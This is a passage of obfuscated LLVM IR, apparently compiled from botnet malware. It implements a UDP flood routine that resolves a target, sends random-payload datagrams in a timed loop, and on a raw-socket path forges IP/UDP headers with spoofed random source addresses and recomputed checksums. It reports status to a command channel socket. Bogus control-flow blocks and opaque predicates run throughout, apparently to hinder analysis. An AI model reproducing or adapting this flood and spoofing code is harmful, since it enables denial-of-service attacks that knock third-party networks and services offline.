  %72 = or i1 %70, %71
  br i1 %72, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %94

; <label>:73:                                     ; preds = %originalBBpart2
  %74 = load i32, i32* @x.63
  %75 = load i32, i32* @y.64
  %76 = sub i32 %74, 1
  %77 = mul i32 %74, %76
  %78 = urem i32 %77, 2
  %79 = icmp eq i32 %78, 0
  %80 = icmp slt i32 %75, 10
  %81 = or i1 %79, %80
  br i1 %81, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %73
  %82 = load i32, i32* %18, align 4
  %83 = trunc i32 %82 to i16
  %84 = call zeroext i16 @htons(i16 zeroext %83) #13
  %85 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %25, i32 0, i32 1
  store i16 %84, i16* %85, align 2
  %86 = load i32, i32* @x.63
  %87 = load i32, i32* @y.64
  %88 = sub i32 %86, 1
  %89 = mul i32 %86, %88
  %90 = urem i32 %89, 2
  %91 = icmp eq i32 %90, 0
  %92 = icmp slt i32 %87, 10
  %93 = or i1 %91, %92
  br i1 %93, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %94

; <label>:94:                                     ; preds = %originalBBpart28, %originalBBpart24
  %95 = load i8*, i8** %17, align 8
  %96 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %25, i32 0, i32 2
  %97 = call i32 @getHost(i8* %95, %struct.in_addr* %96)
  %98 = icmp ne i32 %97, 0
  br i1 %98, label %99, label %100

; <label>:99:                                     ; preds = %94
  br label %503

; <label>:100:                                    ; preds = %94
  %101 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %25, i32 0, i32 3
  %102 = getelementptr inbounds [8 x i8], [8 x i8]* %101, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %102, i8 0, i64 8, i32 4, i1 false)
  %103 = load i32, i32* %22, align 4
  store i32 %103, i32* %26, align 4
  %104 = load i32, i32* %20, align 4
  %105 = icmp eq i32 %104, 32
  br i1 %105, label %106, label %216

; <label>:106:                                    ; preds = %100
  %107 = load i32, i32* @x.63
  %108 = load i32, i32* @y.64
  %109 = sub i32 %107, 1
  %110 = mul i32 %107, %109
  %111 = urem i32 %110, 2
  %112 = icmp eq i32 %111, 0
  %113 = icmp slt i32 %108, 10
  %114 = or i1 %112, %113
  br i1 %114, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %106
  %115 = call i32 @socket(i32 2, i32 2, i32 17) #2
  store i32 %115, i32* %27, align 4
  %116 = load i32, i32* %27, align 4
  %117 = icmp ne i32 %116, 0
  %118 = load i32, i32* @x.63
  %119 = load i32, i32* @y.64
  %120 = sub i32 %118, 1
  %121 = mul i32 %118, %120
  %122 = urem i32 %121, 2
  %123 = icmp eq i32 %122, 0
  %124 = icmp slt i32 %119, 10
  %125 = or i1 %123, %124
  br i1 %125, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %117, label %129, label %126

; <label>:126:                                    ; preds = %originalBBpart212
  %127 = load i32, i32* @mainCommSock, align 4
  %128 = call i32 (i32, i8*, ...) @sockprintf(i32 %127, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.87, i32 0, i32 0))
  br label %503

; <label>:129:                                    ; preds = %originalBBpart212
  %130 = load i32, i32* %21, align 4
  %131 = add nsw i32 %130, 1
  %132 = sext i32 %131 to i64
  %133 = call noalias i8* @malloc(i64 %132) #2
  store i8* %133, i8** %28, align 8
  %134 = load i8*, i8** %28, align 8
  %135 = icmp eq i8* %134, null
  br i1 %135, label %136, label %137

; <label>:136:                                    ; preds = %129
  br label %503

; <label>:137:                                    ; preds = %129
  %138 = load i8*, i8** %28, align 8
  %139 = load i32, i32* %21, align 4
  %140 = add nsw i32 %139, 1
  %141 = sext i32 %140 to i64
  call void @llvm.memset.p0i8.i64(i8* %138, i8 0, i64 %141, i32 1, i1 false)
  %142 = load i8*, i8** %28, align 8
  %143 = load i32, i32* %21, align 4
  call void @RandString(i8* %142, i32 %143)
  %144 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %145 = load i32, i32* %19, align 4
  %146 = add nsw i32 %144, %145
  store i32 %146, i32* %29, align 4
  store i32 0, i32* %30, align 4
  store i32 0, i32* %31, align 4
  br label %147

; <label>:147:                                    ; preds = %212, %208, %201, %137
  %148 = load i32, i32* %27, align 4
  %149 = load i8*, i8** %28, align 8
  %150 = load i32, i32* %21, align 4
  %151 = sext i32 %150 to i64
  %152 = bitcast %struct.sockaddr_in* %25 to %struct.sockaddr*
  %153 = call i64 @sendto(i32 %148, i8* %149, i64 %151, i32 0, %struct.sockaddr* %152, i32 16)
  %154 = load i32, i32* %30, align 4
  %155 = load i32, i32* %26, align 4
  %156 = icmp eq i32 %154, %155
  br i1 %156, label %157, label %202

; <label>:157:                                    ; preds = %147
  %158 = load i32, i32* @x.63
  %159 = load i32, i32* @y.64
  %160 = sub i32 %158, 1
  %161 = mul i32 %158, %160
  %162 = urem i32 %161, 2
  %163 = icmp eq i32 %162, 0
  %164 = icmp slt i32 %159, 10
  %165 = or i1 %163, %164
  br i1 %165, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %157
  %166 = load i32, i32* %18, align 4
  %167 = icmp eq i32 %166, 0
  %168 = load i32, i32* @x.63
  %169 = load i32, i32* @y.64
  %170 = sub i32 %168, 1
  %171 = mul i32 %168, %170
  %172 = urem i32 %171, 2
  %173 = icmp eq i32 %172, 0
  %174 = icmp slt i32 %169, 10
  %175 = or i1 %173, %174
  br i1 %175, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %167, label %176, label %196

; <label>:176:                                    ; preds = %originalBBpart216
  %177 = load i32, i32* @x.63
  %178 = load i32, i32* @y.64
  %179 = sub i32 %177, 1
  %180 = mul i32 %177, %179
  %181 = urem i32 %180, 2
  %182 = icmp eq i32 %181, 0
  %183 = icmp slt i32 %178, 10
  %184 = or i1 %182, %183
  br i1 %184, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %176
  %185 = call i32 @rand_cmwc()
  %186 = trunc i32 %185 to i16
  %187 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %25, i32 0, i32 1
  store i16 %186, i16* %187, align 2
  %188 = load i32, i32* @x.63
  %189 = load i32, i32* @y.64
  %190 = sub i32 %188, 1
  %191 = mul i32 %188, %190
  %192 = urem i32 %191, 2
  %193 = icmp eq i32 %192, 0
  %194 = icmp slt i32 %189, 10
  %195 = or i1 %193, %194
  br i1 %195, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %196

; <label>:196:                                    ; preds = %originalBBpart220, %originalBBpart216
  %197 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %198 = load i32, i32* %29, align 4
  %199 = icmp sgt i32 %197, %198
  br i1 %199, label %200, label %201

; <label>:200:                                    ; preds = %196
  br label %215

; <label>:201:                                    ; preds = %196
  store i32 0, i32* %30, align 4
  br label %147

; <label>:202:                                    ; preds = %147
  %203 = load i32, i32* %30, align 4
  %204 = add i32 %203, 1
  store i32 %204, i32* %30, align 4
  %205 = load i32, i32* %31, align 4
  %206 = load i32, i32* %23, align 4
  %207 = icmp eq i32 %205, %206
  br i1 %207, label %208, label %212

; <label>:208:                                    ; preds = %202
  %209 = load i32, i32* %24, align 4
  %210 = mul nsw i32 %209, 1000
  %211 = call i32 @usleep(i32 %210)
  store i32 0, i32* %31, align 4
  br label %147

; <label>:212:                                    ; preds = %202
  %213 = load i32, i32* %31, align 4
  %214 = add i32 %213, 1
  store i32 %214, i32* %31, align 4
  br label %147

; <label>:215:                                    ; preds = %200
  br label %503

; <label>:216:                                    ; preds = %100
  %217 = call i32 @socket(i32 2, i32 3, i32 17) #2
  store i32 %217, i32* %32, align 4
  %218 = load i32, i32* %32, align 4
  %219 = icmp ne i32 %218, 0
  br i1 %219, label %223, label %220

; <label>:220:                                    ; preds = %216
  %221 = load i32, i32* @mainCommSock, align 4
  %222 = call i32 (i32, i8*, ...) @sockprintf(i32 %221, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.87, i32 0, i32 0))
  br label %503

; <label>:223:                                    ; preds = %216
  store i32 1, i32* %33, align 4
  %224 = load i32, i32* %32, align 4
  %225 = bitcast i32* %33 to i8*
  %226 = call i32 @setsockopt(i32 %224, i32 0, i32 3, i8* %225, i32 4) #2
  %227 = icmp slt i32 %226, 0
  br i1 %227, label %228, label %231

; <label>:228:                                    ; preds = %223
  %229 = load i32, i32* @mainCommSock, align 4
  %230 = call i32 (i32, i8*, ...) @sockprintf(i32 %229, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.88, i32 0, i32 0))
  br label %503

; <label>:231:                                    ; preds = %223
  store i32 50, i32* %34, align 4
  br label %232

; <label>:232:                                    ; preds = %236, %231
  %233 = load i32, i32* %34, align 4
  %234 = add nsw i32 %233, -1
  store i32 %234, i32* %34, align 4
  %235 = icmp ne i32 %233, 0
  br i1 %235, label %236, label %241

; <label>:236:                                    ; preds = %232
  %237 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %238 = call i32 @rand_cmwc()
  %239 = xor i32 %237, %238
  call void @srand(i32 %239) #2
  %240 = call i32 @rand() #2
  call void @init_rand(i32 %240)
  br label %232

; <label>:241:                                    ; preds = %232
  %242 = load i32, i32* %20, align 4
  %243 = icmp eq i32 %242, 0
  br i1 %243, label %244, label %261

; <label>:244:                                    ; preds = %241
  %245 = load i32, i32* @x.63
  %246 = load i32, i32* @y.64
  %247 = sub i32 %245, 1
  %248 = mul i32 %245, %247
  %249 = urem i32 %248, 2
  %250 = icmp eq i32 %249, 0
  %251 = icmp slt i32 %246, 10
  %252 = or i1 %250, %251
  br i1 %252, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %244
  store i32 0, i32* %35, align 4
  %253 = load i32, i32* @x.63
  %254 = load i32, i32* @y.64
  %255 = sub i32 %253, 1
  %256 = mul i32 %253, %255
  %257 = urem i32 %256, 2
  %258 = icmp eq i32 %257, 0
  %259 = icmp slt i32 %254, 10
  %260 = or i1 %258, %259
  br i1 %260, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %283

; <label>:261:                                    ; preds = %241
  %262 = load i32, i32* @x.63
  %263 = load i32, i32* @y.64
  %264 = sub i32 %262, 1
  %265 = mul i32 %262, %264
  %266 = urem i32 %265, 2
  %267 = icmp eq i32 %266, 0
  %268 = icmp slt i32 %263, 10
  %269 = or i1 %267, %268
  br i1 %269, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %261
  %270 = load i32, i32* %20, align 4
  %271 = sub nsw i32 32, %270
  %272 = shl i32 1, %271
  %273 = sub nsw i32 %272, 1
  %274 = xor i32 %273, -1
  store i32 %274, i32* %35, align 4
  %275 = load i32, i32* @x.63
  %276 = load i32, i32* @y.64
  %277 = sub i32 %275, 1
  %278 = mul i32 %275, %277
  %279 = urem i32 %278, 2
  %280 = icmp eq i32 %279, 0
  %281 = icmp slt i32 %276, 10
  %282 = or i1 %280, %281
  br i1 %282, label %originalBBpart250, label %originalBB26alteredBB

originalBBpart250:                                ; preds = %originalBB26
  br label %283

; <label>:283:                                    ; preds = %originalBBpart250, %originalBBpart224
  %284 = load i32, i32* @x.63
  %285 = load i32, i32* @y.64
  %286 = sub i32 %284, 1
  %287 = mul i32 %284, %286
  %288 = urem i32 %287, 2
  %289 = icmp eq i32 %288, 0
  %290 = icmp slt i32 %285, 10
  %291 = or i1 %289, %290
  br i1 %291, label %originalBB52, label %originalBB52alteredBB

originalBB52:                                     ; preds = %originalBB52alteredBB, %283
  %292 = load i32, i32* %21, align 4
  %293 = sext i32 %292 to i64
  %294 = add i64 28, %293
  %295 = call i8* @llvm.stacksave()
  store i8* %295, i8** %36, align 8
  %296 = alloca i8, i64 %294, align 16
  %297 = bitcast i8* %296 to %struct.iphdr*
  store %struct.iphdr* %297, %struct.iphdr** %37, align 8
  %298 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %299 = bitcast %struct.iphdr* %298 to i8*
  %300 = getelementptr i8, i8* %299, i64 20
  %301 = bitcast i8* %300 to %struct.udphdr*
  store %struct.udphdr* %301, %struct.udphdr** %38, align 8
  %302 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %303 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %25, i32 0, i32 2
  %304 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %303, i32 0, i32 0
  %305 = load i32, i32* %304, align 4
  %306 = load i32, i32* %35, align 4
  %307 = call i32 @GetRandomIP(i32 %306)
  %308 = call i32 @htonl(i32 %307) #13
  %309 = load i32, i32* %21, align 4
  %310 = sext i32 %309 to i64
  %311 = add i64 8, %310
  %312 = trunc i64 %311 to i32
  call void @makeIPPacket(%struct.iphdr* %302, i32 %305, i32 %308, i8 zeroext 17, i32 %312)
  %313 = load i32, i32* %21, align 4
  %314 = sext i32 %313 to i64
  %315 = add i64 8, %314
  %316 = trunc i64 %315 to i16
  %317 = call zeroext i16 @htons(i16 zeroext %316) #13
  %318 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %319 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %318, i32 0, i32 0
  %320 = bitcast %union.anon.2* %319 to %struct.anon.3*
  %321 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %320, i32 0, i32 2
  store i16 %317, i16* %321, align 2
  %322 = call i32 @rand_cmwc()
  %323 = trunc i32 %322 to i16
  %324 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %325 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %324, i32 0, i32 0
  %326 = bitcast %union.anon.2* %325 to %struct.anon.3*
  %327 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %326, i32 0, i32 0
  store i16 %323, i16* %327, align 2
  %328 = load i32, i32* %18, align 4
  %329 = icmp eq i32 %328, 0
  %330 = load i32, i32* @x.63
  %331 = load i32, i32* @y.64
  %332 = sub i32 %330, 1
  %333 = mul i32 %330, %332
  %334 = urem i32 %333, 2
  %335 = icmp eq i32 %334, 0
  %336 = icmp slt i32 %331, 10
  %337 = or i1 %335, %336
  br i1 %337, label %originalBBpart274, label %originalBB52alteredBB

originalBBpart274:                                ; preds = %originalBB52
  br i1 %329, label %338, label %340

; <label>:338:                                    ; preds = %originalBBpart274
  %339 = call i32 @rand_cmwc()
  br label %345

; <label>:340:                                    ; preds = %originalBBpart274
  %341 = load i32, i32* %18, align 4
  %342 = trunc i32 %341 to i16
  %343 = call zeroext i16 @htons(i16 zeroext %342) #13
  %344 = zext i16 %343 to i32
  br label %345

; <label>:345:                                    ; preds = %340, %338
  %346 = phi i32 [ %339, %338 ], [ %344, %340 ]
  %347 = trunc i32 %346 to i16
  %348 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %349 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %348, i32 0, i32 0
  %350 = bitcast %union.anon.2* %349 to %struct.anon.3*
  %351 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %350, i32 0, i32 1
  store i16 %347, i16* %351, align 2
  %352 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %353 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %352, i32 0, i32 0
  %354 = bitcast %union.anon.2* %353 to %struct.anon.3*
  %355 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %354, i32 0, i32 3
  store i16 0, i16* %355, align 2
  %356 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %357 = bitcast %struct.udphdr* %356 to i8*
  %358 = getelementptr inbounds i8, i8* %357, i64 8
  %359 = load i32, i32* %21, align 4
  call void @RandString(i8* %358, i32 %359)
  %360 = bitcast i8* %296 to i16*
  %361 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %362 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %361, i32 0, i32 2
  %363 = load i16, i16* %362, align 2
  %364 = zext i16 %363 to i32
  %365 = call zeroext i16 @csum(i16* %360, i32 %364)
  %366 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %367 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %366, i32 0, i32 7
  store i16 %365, i16* %367, align 2
  %368 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %369 = load i32, i32* %19, align 4
  %370 = add nsw i32 %368, %369
  store i32 %370, i32* %39, align 4
  store i32 0, i32* %40, align 4
  store i32 0, i32* %41, align 4
  br label %371

; <label>:371:                                    ; preds = %482, %478, %455, %345
  br label %372

; <label>:372:                                    ; preds = %371
  %373 = load i32, i32* @x.63
  %374 = load i32, i32* @y.64
  %375 = sub i32 %373, 1
  %376 = mul i32 %373, %375
  %377 = urem i32 %376, 2
  %378 = icmp eq i32 %377, 0
  %379 = icmp slt i32 %374, 10
  %380 = or i1 %378, %379
  br i1 %380, label %originalBB76, label %originalBB76alteredBB

originalBB76:                                     ; preds = %originalBB76alteredBB, %372
  %381 = load i32, i32* %32, align 4
  %382 = bitcast %struct.sockaddr_in* %25 to %struct.sockaddr*
  %383 = call i64 @sendto(i32 %381, i8* %296, i64 %294, i32 0, %struct.sockaddr* %382, i32 16)
  %384 = call i32 @rand_cmwc()
  %385 = trunc i32 %384 to i16
  %386 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %387 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %386, i32 0, i32 0
  %388 = bitcast %union.anon.2* %387 to %struct.anon.3*
  %389 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %388, i32 0, i32 0
  store i16 %385, i16* %389, align 2
  %390 = load i32, i32* %18, align 4
  %391 = icmp eq i32 %390, 0
  %392 = load i32, i32* @x.63
  %393 = load i32, i32* @y.64
  %394 = sub i32 %392, 1
  %395 = mul i32 %392, %394
  %396 = urem i32 %395, 2
  %397 = icmp eq i32 %396, 0
  %398 = icmp slt i32 %393, 10
  %399 = or i1 %397, %398
  br i1 %399, label %originalBBpart278, label %originalBB76alteredBB

originalBBpart278:                                ; preds = %originalBB76
  br i1 %391, label %400, label %402

; <label>:400:                                    ; preds = %originalBBpart278
  %401 = call i32 @rand_cmwc()
  br label %407

; <label>:402:                                    ; preds = %originalBBpart278
  %403 = load i32, i32* %18, align 4
  %404 = trunc i32 %403 to i16
  %405 = call zeroext i16 @htons(i16 zeroext %404) #13
  %406 = zext i16 %405 to i32
  br label %407

; <label>:407:                                    ; preds = %402, %400
  %408 = phi i32 [ %401, %400 ], [ %406, %402 ]
  %409 = trunc i32 %408 to i16
  %410 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %411 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %410, i32 0, i32 0
  %412 = bitcast %union.anon.2* %411 to %struct.anon.3*
  %413 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %412, i32 0, i32 1
  store i16 %409, i16* %413, align 2
  %414 = call i32 @rand_cmwc()
  %415 = trunc i32 %414 to i16
  %416 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %417 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %416, i32 0, i32 3
  store i16 %415, i16* %417, align 4
  %418 = load i32, i32* %35, align 4
  %419 = call i32 @GetRandomIP(i32 %418)
  %420 = call i32 @htonl(i32 %419) #13
  %421 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %422 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %421, i32 0, i32 8
  store i32 %420, i32* %422, align 4
  %423 = bitcast i8* %296 to i16*
  %424 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %425 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %424, i32 0, i32 2
  %426 = load i16, i16* %425, align 2
  %427 = zext i16 %426 to i32
  %428 = call zeroext i16 @csum(i16* %423, i32 %427)
  %429 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %430 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %429, i32 0, i32 7
  store i16 %428, i16* %430, align 2
  %431 = load i32, i32* %40, align 4
  %432 = load i32, i32* %26, align 4
  %433 = icmp eq i32 %431, %432
  br i1 %433, label %434, label %456

; <label>:434:                                    ; preds = %407
  %435 = load i32, i32* @x.63
  %436 = load i32, i32* @y.64
  %437 = sub i32 %435, 1
  %438 = mul i32 %435, %437
  %439 = urem i32 %438, 2
  %440 = icmp eq i32 %439, 0
  %441 = icmp slt i32 %436, 10
  %442 = or i1 %440, %441
  br i1 %442, label %originalBB80, label %originalBB80alteredBB

originalBB80:                                     ; preds = %originalBB80alteredBB, %434
  %443 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %444 = load i32, i32* %39, align 4
  %445 = icmp sgt i32 %443, %444
  %446 = load i32, i32* @x.63
  %447 = load i32, i32* @y.64
  %448 = sub i32 %446, 1
  %449 = mul i32 %446, %448
  %450 = urem i32 %449, 2
  %451 = icmp eq i32 %450, 0
  %452 = icmp slt i32 %447, 10
  %453 = or i1 %451, %452
  br i1 %453, label %originalBBpart282, label %originalBB80alteredBB

originalBBpart282:                                ; preds = %originalBB80
  br i1 %445, label %454, label %455

; <label>:454:                                    ; preds = %originalBBpart282
  br label %485

; <label>:455:                                    ; preds = %originalBBpart282
  store i32 0, i32* %40, align 4
  br label %371

; <label>:456:                                    ; preds = %407
  %457 = load i32, i32* @x.63
  %458 = load i32, i32* @y.64
  %459 = sub i32 %457, 1
  %460 = mul i32 %457, %459
  %461 = urem i32 %460, 2
  %462 = icmp eq i32 %461, 0
  %463 = icmp slt i32 %458, 10
  %464 = or i1 %462, %463
  br i1 %464, label %originalBB84, label %originalBB84alteredBB

originalBB84:                                     ; preds = %originalBB84alteredBB, %456
  %465 = load i32, i32* %40, align 4
  %466 = add i32 %465, 1
  store i32 %466, i32* %40, align 4
  %467 = load i32, i32* %41, align 4
  %468 = load i32, i32* %23, align 4
  %469 = icmp eq i32 %467, %468
  %470 = load i32, i32* @x.63
  %471 = load i32, i32* @y.64
  %472 = sub i32 %470, 1
  %473 = mul i32 %470, %472
  %474 = urem i32 %473, 2
  %475 = icmp eq i32 %474, 0
  %476 = icmp slt i32 %471, 10
  %477 = or i1 %475, %476
  br i1 %477, label %originalBBpart2100, label %originalBB84alteredBB

originalBBpart2100:                               ; preds = %originalBB84
  br i1 %469, label %478, label %482

; <label>:478:                                    ; preds = %originalBBpart2100
  %479 = load i32, i32* %24, align 4
  %480 = mul nsw i32 %479, 1000
  %481 = call i32 @usleep(i32 %480)
  store i32 0, i32* %41, align 4
  br label %371

; <label>:482:                                    ; preds = %originalBBpart2100
  %483 = load i32, i32* %41, align 4
  %484 = add i32 %483, 1
  store i32 %484, i32* %41, align 4
  br label %371

; <label>:485:                                    ; preds = %454
  %486 = load i32, i32* @x.63
  %487 = load i32, i32* @y.64
  %488 = sub i32 %486, 1
  %489 = mul i32 %486, %488
  %490 = urem i32 %489, 2
  %491 = icmp eq i32 %490, 0
  %492 = icmp slt i32 %487, 10
  %493 = or i1 %491, %492
  br i1 %493, label %originalBB102, label %originalBB102alteredBB

originalBB102:                                    ; preds = %originalBB102alteredBB, %485
  %494 = load i8*, i8** %36, align 8
  call void @llvm.stackrestore(i8* %494)
  %495 = load i32, i32* @x.63
  %496 = load i32, i32* @y.64
  %497 = sub i32 %495, 1
  %498 = mul i32 %495, %497
  %499 = urem i32 %498, 2
  %500 = icmp eq i32 %499, 0
  %501 = icmp slt i32 %496, 10
  %502 = or i1 %500, %501
  br i1 %502, label %originalBBpart2104, label %originalBB102alteredBB

originalBBpart2104:                               ; preds = %originalBB102
  br label %503

; <label>:503:                                    ; preds = %originalBBpart2104, %228, %220, %215, %136, %126, %99
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %8
  %504 = alloca i8*, align 8
  %505 = alloca i32, align 4
  %506 = alloca i32, align 4
  %507 = alloca i32, align 4
  %508 = alloca i32, align 4
  %509 = alloca i32, align 4
  %510 = alloca i32, align 4
  %511 = alloca i32, align 4
  %512 = alloca %struct.sockaddr_in, align 4
  %513 = alloca i32, align 4
  %514 = alloca i32, align 4
  %515 = alloca i8*, align 8
  %516 = alloca i32, align 4
  %517 = alloca i32, align 4
  %518 = alloca i32, align 4
  %519 = alloca i32, align 4
  %520 = alloca i32, align 4
  %521 = alloca i32, align 4
  %522 = alloca i32, align 4
  %523 = alloca i8*, align 8
  %524 = alloca %struct.iphdr*, align 8
  %525 = alloca %struct.udphdr*, align 8
  %526 = alloca i32, align 4
  %527 = alloca i32, align 4
  %528 = alloca i32, align 4
  store i8* %0, i8** %504, align 8
  store i32 %1, i32* %505, align 4
  store i32 %2, i32* %506, align 4
  store i32 %3, i32* %507, align 4
  store i32 %4, i32* %508, align 4
  store i32 %5, i32* %509, align 4
  store i32 %6, i32* %510, align 4
  store i32 %7, i32* %511, align 4
  %529 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %512, i32 0, i32 0
  store i16 2, i16* %529, align 4
  %530 = load i32, i32* %505, align 4
  %531 = icmp eq i32 %530, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %53
  %532 = call i32 @rand_cmwc()
  %533 = trunc i32 %532 to i16
  %534 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %25, i32 0, i32 1
  store i16 %533, i16* %534, align 2
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %73
  %535 = load i32, i32* %18, align 4
  %536 = trunc i32 %535 to i16
  %537 = call zeroext i16 @htons(i16 zeroext %536) #13
  %538 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %25, i32 0, i32 1
  store i16 %537, i16* %538, align 2
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %106
  %539 = call i32 @socket(i32 2, i32 2, i32 17) #2
  store i32 %539, i32* %27, align 4
  %540 = load i32, i32* %27, align 4
  %541 = icmp ne i32 %540, 0
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %157
  %542 = load i32, i32* %18, align 4
  %543 = icmp eq i32 %542, 0
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %176
  %544 = call i32 @rand_cmwc()
  %545 = trunc i32 %544 to i16
  %546 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %25, i32 0, i32 1
  store i16 %545, i16* %546, align 2
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %244
  store i32 0, i32* %35, align 4
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %261
  %547 = load i32, i32* %20, align 4
  %_ = sub i32 32, %547
  %gen = mul i32 %_, %547
  %_27 = sub i32 0, 32
  %gen28 = add i32 %_27, %547
  %_29 = sub i32 32, %547
  %gen30 = mul i32 %_29, %547
  %_31 = sub i32 0, 32
  %gen32 = add i32 %_31, %547
  %548 = sub nsw i32 32, %547
  %_33 = sub i32 1, %548
  %gen34 = mul i32 %_33, %548
  %_35 = sub i32 1, %548
  %gen36 = mul i32 %_35, %548
  %_37 = sub i32 1, %548
  %gen38 = mul i32 %_37, %548
  %_39 = shl i32 1, %548
  %549 = shl i32 1, %548
  %_40 = sub i32 0, %549
  %gen41 = add i32 %_40, 1
  %_42 = sub i32 0, %549
  %gen43 = add i32 %_42, 1
  %550 = sub nsw i32 %549, 1
  %_44 = sub i32 %550, -1
  %gen45 = mul i32 %_44, -1
  %_46 = shl i32 %550, -1
  %_47 = shl i32 %550, -1
  %_48 = shl i32 %550, -1
  %551 = xor i32 %550, -1
  store i32 %551, i32* %35, align 4
  br label %originalBB26

originalBB52alteredBB:                            ; preds = %originalBB52, %283
  %552 = load i32, i32* %21, align 4
  %553 = sext i32 %552 to i64
  %_53 = sub i64 0, 28
  %gen54 = add i64 %_53, %553
  %_55 = sub i64 28, %553
  %gen56 = mul i64 %_55, %553
  %_57 = sub i64 0, 28
  %gen58 = add i64 %_57, %553
  %554 = add i64 28, %553
  %555 = call i8* @llvm.stacksave()
  store i8* %555, i8** %36, align 8
  %556 = alloca i8, i64 %554, align 16
  %557 = bitcast i8* %556 to %struct.iphdr*
  store %struct.iphdr* %557, %struct.iphdr** %37, align 8
  %558 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %559 = bitcast %struct.iphdr* %558 to i8*
  %560 = getelementptr i8, i8* %559, i64 20
  %561 = bitcast i8* %560 to %struct.udphdr*
  store %struct.udphdr* %561, %struct.udphdr** %38, align 8
  %562 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %563 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %25, i32 0, i32 2
  %564 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %563, i32 0, i32 0
  %565 = load i32, i32* %564, align 4
  %566 = load i32, i32* %35, align 4
  %567 = call i32 @GetRandomIP(i32 %566)
  %568 = call i32 @htonl(i32 %567) #13
  %569 = load i32, i32* %21, align 4
  %570 = sext i32 %569 to i64
  %_59 = sub i64 8, %570
  %gen60 = mul i64 %_59, %570
  %_61 = sub i64 0, 8
  %gen62 = add i64 %_61, %570
  %_63 = sub i64 8, %570
  %gen64 = mul i64 %_63, %570
  %_65 = shl i64 8, %570
  %571 = add i64 8, %570
  %572 = trunc i64 %571 to i32
